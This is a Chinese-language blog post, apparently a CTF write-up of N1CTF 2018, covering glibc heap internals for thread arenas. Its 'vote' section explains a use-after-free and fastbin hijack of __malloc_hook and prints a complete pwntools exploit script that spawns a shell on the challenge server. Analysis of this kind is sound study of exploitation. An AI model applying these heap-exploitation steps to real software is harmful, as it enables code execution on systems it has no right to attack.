<!DOCTYPE html>
<html>
    <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
    <title>
        
        N1CTF 2018 &amp;&amp; 线程堆知识源代码分析 · p4nda&#39;s blog
        
    </title>
    <link rel="icon" href= /assets/p4nda.ico>
    <!-- TODO: 在font-face加载完毕后改变字体  -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
    <!-- 提前加载place holder  -->
    <style type="text/css">
        @font-face {
            font-family: 'Oswald-Regular';
            src: url(/font/Oswald-Regular.ttf);
        }
    </style>
    <style type="text/css">
        .site-intro {
            position: relative;
            width: 100%;
            height: 50vh;
            overflow: hidden;
            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
        }
        .site-intro-placeholder {
            position: absolute;
            z-index: -2;
            top: 0;
            left: 0px;
            width: calc(100% + 300px);
            height: 100%;
            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
            background-position: center center;
            transform: translate3d(-226px, 0, 0);
            animation: gradient-move 2.5s ease-out 0s 1;
        }
        @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>
    <link rel="stylesheet" href = /css/style.css?v=20180120 />
    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
    
    <script src="/scripts/main.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >p4nda@dubhe</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">N1CTF 2018 && 线程堆知识源代码分析</a>
            </div>
    </div>
    
    <a class="home-link" href=/>p4nda@dubhe</a>
</header>
    <div class="wrapper">
        <div class="site-intro">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-img" style="background-image: url(/intro/basket.jpg)"></div>
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            N1CTF 2018 && 线程堆知识源代码分析
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <!-- 文章页标签  -->
            
                <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-href = PWN>PWN</a>
    
        <a class="post-tag" href="javascript:void(0);" data-href = Linux>Linux</a>
    
</div>
            
            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
            <div class="post-intro-meta">
                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                <span class="post-intro-time">2018/03/15</span>
                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                    <span class="iconfont-archer">&#xe604;</span>
                    <span id="busuanzi_value_page_pv"></span>
                </span>
                <span class="shareWrapper">
                    <span class="iconfont-archer shareIcon">
                        &#xe601;
                    </span>
                    <span class="bdsharebuttonbox">
                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
                    </span>
                </span>
            </div>
        
    </div>
</div>
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <script>
            var browser = {
                    versions: function () {
                        var u = window.navigator.userAgent;
                        return {
                            userAgent: u,
                            trident: u.indexOf('Trident') > -1, //IE内核
                            presto: u.indexOf('Presto') > -1, //opera内核
                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
                            iPad: u.indexOf('iPad') > -1, //是否为iPad
                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
                        };
                    }()
                }

            function fontLoaded(){
                console.log('font loaded');
                if (document.getElementsByClassName('site-intro-meta')) {
                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
                        if (postIntroTags) {
                            postIntroTags.classList.add('post-fade-in');
                        }
                        if (postIntroMeat) {
                            postIntroMeat.classList.add('post-fade-in');
                        }
                    }
                }
                
            console.log("userAgent:" + browser.versions.userAgent);
            // UC不支持跨域，所以直接显示
            if (browser.versions.uc) {
                console.log("UCBrowser");
                fontLoaded();
            } else {
                WebFont.load({
                    custom: {
                        families: ['Oswald-Regular']
                    },
                    loading: function () {  //所有字体开始加载
                        // console.log('loading');
                    },
                    active: function () {  //所有字体已渲染
                        fontLoaded();
                    },
                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
                        console.log('inactive: timeout');
                        fontLoaded();
                    },
                    timeout: 7000 // Set the timeout to two seconds
                });
            }
        </script>
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <p>Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。</p>
<h1 id="vote"><a href="#vote" class="headerlink" title="vote"></a>vote</h1><p>一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目是一个投票系统，主要包括5个函数：</p>
<p><img src="/img/n1ctf2018/1-1.png" alt=""></p>
<p>涉及的数据结构是投票者的票数和名字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0             8                16                 ...</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| number      |     time       |   name  .........  | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<p>这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。</p>
<p><img src="/img/n1ctf2018/1-2.png" alt=""></p>
<p><img src="/img/n1ctf2018/1-3.png" alt=""></p>
<p>说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞：</p>
<p><img src="/img/n1ctf2018/1-4.png" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。</p>
<h3 id="Fastbin劫持"><a href="#Fastbin劫持" class="headerlink" title="Fastbin劫持"></a>Fastbin劫持</h3><p>同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。</p>
<p>首先，分配两个<strong>大小为0x70</strong> 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。</p>
<p>这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。</p>
<p>这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。</p>
<p>当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./vote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./vote'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.90.103.10'</span>,<span class="number">6000</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vote</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">	p.sendline(str(index))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">	p.sendline(str(index))	</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3e0</span>,<span class="string">'p4nda'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">555</span>,<span class="string">'p4nda'</span>) <span class="comment">#1</span></span><br><span class="line">cancel(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'count: '</span>)</span><br><span class="line">leak = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">libc.address = leak - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>, hex(leak)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0x71</span>)+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>) )<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add(555,'p4nda') #4</span></span><br><span class="line">cancel(<span class="number">2</span>)</span><br><span class="line">cancel(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	vote(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4n'</span>+p64(libc.address + <span class="number">0xf0274</span>))<span class="comment">#0xf02a4))#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x50</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0274	execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1117	execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h1 id="null"><a href="#null" class="headerlink" title="null"></a>null</h1><p>涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 <strong>a relatively easy task </strong>。 </p>
<p>还是记录一下线程堆块分配的姿势。</p>
<h1 id="线程堆块分配"><a href="#线程堆块分配" class="headerlink" title="线程堆块分配"></a>线程堆块分配</h1><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>分配区</strong> 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores + 1.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores + 1.</span><br></pre></td></tr></table></figure>
<p><strong>锁</strong> 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。</p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol>
<li><p>_heap_info</p>
<p><strong>仅存在于线程堆块里</strong>的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。</p>
<p><strong>主要原因是</strong> ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。</p>
<p>该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>malloc_state</p>
<p>对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。</p>
<p>每一个线程有<strong>唯一</strong> 的malloc_state数据结构，即thread arena。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="结构组织"><a href="#结构组织" class="headerlink" title="结构组织"></a>结构组织</h3><ol>
<li><p><strong>分配区的获取</strong></p>
<p>可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure>
<p>malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。</p>
<p>跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;					      \</span></span><br><span class="line">      <span class="keyword">if</span> (ptr &amp;&amp; !arena_is_corrupt (ptr))				      \</span><br><span class="line">        (<span class="keyword">void</span>) mutex_lock (&amp;ptr-&gt;mutex);				      \</span><br><span class="line">      <span class="keyword">else</span>								      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);				      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2：</p>
<p>首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。</p>
<p>narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">arena_get2 (<span class="keyword">size_t</span> size, mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span 